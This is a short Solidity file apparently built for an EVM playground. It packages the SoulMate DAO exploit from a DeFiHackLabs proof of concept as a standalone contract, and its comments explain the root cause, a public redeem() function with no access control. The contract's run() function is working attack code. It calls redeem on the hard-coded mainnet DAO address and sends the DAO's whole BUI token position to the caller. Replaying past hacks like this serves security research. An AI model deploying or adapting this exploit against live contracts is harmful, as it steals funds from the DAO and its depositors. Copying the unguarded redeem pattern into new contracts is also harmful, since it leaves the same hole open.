// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-DAO_SoulMate).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker == address(this); there is no standalone exploit contract). This
// contract is a faithful, self-contained copy of that inline attack (a single
// unguarded redeem() call) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from
// test/DAO_SoulMate_exp.sol::testExploit().
//
// Root cause: the "SoulMate" DAO contract exposes a public
// redeem(uint256,address) with NO access control, forwarding straight to the
// Set Protocol BasicIssuanceModule wrapped by the BUI SetToken. Anyone can
// redeem the DAO's entire BUI position and name themselves as the receiver of
// every underlying component token.

interface ISoulMateContract {
    function redeem(uint256 _shares, address _receiver) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract SoulMateDrain {
    ISoulMateContract private constant SoulMateContract =
        ISoulMateContract(0x82C063AFEFB226859aBd427Ae40167cB77174b68);
    IERC20 private constant BUI = IERC20(0xb7470Fd67e997b73f55F85A6AF0DeB2c96194885);

    // No access control on SoulMate's redeem() — anyone can drain the DAO's
    // entire BUI position to a receiver of their choosing.
    function run() external {
        SoulMateContract.redeem(BUI.balanceOf(address(SoulMateContract)), msg.sender);
    }
}
